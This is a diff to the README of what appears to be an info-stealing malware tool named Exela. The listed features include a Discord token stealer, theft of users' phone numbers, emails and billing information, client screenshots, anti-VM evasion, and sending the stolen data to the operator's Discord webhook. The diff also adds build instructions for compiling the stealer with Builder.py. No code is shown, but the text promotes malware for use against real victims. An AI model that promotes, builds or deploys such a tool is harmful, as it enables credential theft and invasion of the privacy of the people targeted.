@@ -19,7 +19,7 @@
 
 - Discord Token Stealer
 
-- All private Discord info's ("Username, Phone Numbers, Email Adress, Billing information, Nitro status, Discord Account Biograph, Discord Account PP")
+- All private Discord info's ("Username, Phone Numbers, Email Adress, Billing information, Nitro status, Discord Account Biography, Discord Account PP")
 
 - Screesnhot from Client
 
@@ -30,6 +30,12 @@
 - Anti-VM
 
 - Sends all files to your discord webhook in beautiful embeds and a structured zip file
+
+# Usage
+
+- Download the latest version of python from https://www.python.org/
+
+- Open the Exela folder on cmd and write python Builder.py and wait for the compiling
 
 # Warning
 
